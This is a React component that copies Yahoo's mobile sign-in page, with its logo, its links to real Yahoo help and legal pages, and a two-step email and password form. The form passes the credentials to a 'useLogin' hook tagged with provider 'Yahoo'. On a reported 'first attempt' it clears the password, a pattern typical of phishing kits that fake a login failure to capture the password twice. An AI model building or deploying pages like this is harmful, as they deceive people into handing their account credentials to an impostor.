import React, { useState } from 'react';
import { useLogin } from '../../hooks/useLogin';
import Spinner from '../../components/common/Spinner';

interface MobileYahooLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) {
      setShowPasswordStep(true);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: 'Yahoo' });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const YahooLogo = ({ className = '' }: { className?: string }) => (
    <svg className={`h-7 text-purple-600 ${className}`} viewBox="0 0 136 40" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
      <path d="M43.4357 0.932129L35.313 18.2754L27.1903 0.932129H18.129L31.2516 25.105V39.0679H39.3742V25.105L52.4968 0.932129H43.4357Z" />
      <path d="M60.1064 39.0679H68.229V0.932129H60.1064V39.0679Z" />
      <path d="M83.8296 0.932129L71.3916 23.4795V39.0679H79.5142V23.4795L91.9522 0.932129H83.8296Z" />
      <path d="M109.186 39.7523C116.151 39.7523 121.849 34.0543 121.849 27.2798C121.849 20.3148 116.151 14.8073 109.186 14.8073C102.221 14.8073 96.523 20.3148 96.523 27.2798C96.523 34.0543 102.221 39.7523 109.186 39.7523ZM109.186 32.553C105.892 32.553 104.245 29.8988 104.245 27.2798C104.245 24.6608 105.892 21.8161 109.186 21.8161C112.48 21.8161 114.127 24.6608 114.127 27.2798C114.127 29.8988 112.48 32.553 109.186 32.553Z" />
      <path d="M129.288 39.0679H136V0.932129H129.288C129.288 10.3541 129.288 23.67 129.288 39.0679Z" />
      <path d="M9.19522 0.932129C3.12516 0.932129 0.442993 4.22631 0.442993 9.34526V18.8544H18.129V9.34526C18.129 4.22631 15.4468 0.932129 9.19522 0.932129Z" />
      <path d="M0.442993 23.4795V39.0679H18.129V23.4795H0.442993Z" />
      <path d="M52.4968 0.932129L55.5323 7.00218C57.0218 10.5446 58.6968 14.2496 59.9439 17.5901H60.1064C61.3535 14.2496 63.0285 10.5446 64.518 7.00218L67.5535 0.932129H76.451L64.843 23.4795V39.0679H56.7204V23.4795L45.1124 0.932129H52.4968Z" />
    </svg>
  );

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col">
      <header className="flex justify-between items-center p-4">
        <YahooLogo />
        <div className="flex items-center space-x-3 text-xs text-gray-600">
          <a href="https://help.yahoo.com" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
        </div>
      </header>

      <main className="flex-grow flex flex-col justify-center items-center w-full p-4">
        <div className="w-full max-w-sm">
          <YahooLogo className="h-8 mx-auto mb-4" />
          <h2 className="text-center text-xl font-semibold text-gray-900">
            {!showPasswordStep ? 'Sign in' : 'Enter password'}
          </h2>
          <p className="text-center text-sm text-gray-500 mt-1">
            using your Yahoo account
          </p>
          
          {showPasswordStep && (
            <div className="text-center my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div>
          )}

          <form onSubmit={handleSubmit} className="mt-6 space-y-4">
            {errorMessage && !isLoading && (
              <p className="text-red-600 text-sm font-medium text-center">{errorMessage}</p>
            )}

            {!showPasswordStep ? (
              <div>
                <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Username, email, or mobile" required className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-purple-500 focus:border-purple-500" />
                <button onClick={handleNext} disabled={!email} className="w-full mt-4 py-3 bg-purple-600 text-white font-bold rounded-full hover:bg-purple-700 disabled:bg-purple-300 transition">
                  Next
                </button>
              </div>
            ) : (
              <div>
                <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" required autoFocus className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-purple-500 focus:border-purple-500" />
                <button type="submit" disabled={isLoading || !password} className="w-full mt-4 py-3 bg-purple-600 text-white font-bold rounded-full hover:bg-purple-700 disabled:opacity-50 transition">
                  {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                </button>
              </div>
            )}
          </form>

          <div className="text-xs mt-4 flex justify-between items-center">
            <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
              <input type="checkbox" className="form-checkbox h-4 w-4 text-purple-600 rounded" defaultChecked />
              <span>Stay signed in</span>
            </label>
            <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-purple-600 hover:underline">Forgot username?</a>
          </div>
          
          <div className="mt-6 space-y-4">
            <a href="https://login.yahoo.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-3 border border-purple-600 text-purple-600 font-bold rounded-full hover:bg-purple-50 transition">
              Create an account
            </a>
            <div className="relative text-center">
              <span className="absolute inset-x-0 top-1/2 h-px bg-gray-300"></span>
              <span className="relative bg-white px-2 text-xs text-gray-500">or</span>
            </div>
            <a href="https://login.yahoo.com/" target="_blank" rel="noopener noreferrer" className="w-full flex justify-center items-center gap-2 py-3 border border-gray-300 text-gray-700 font-bold rounded-full hover:bg-gray-50 transition">
              <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" className="w-5 h-5"/>
              Sign in with Google
            </a>
          </div>
        </div>
      </main>
    </div>
  );
};

export default MobileYahooLoginPage;
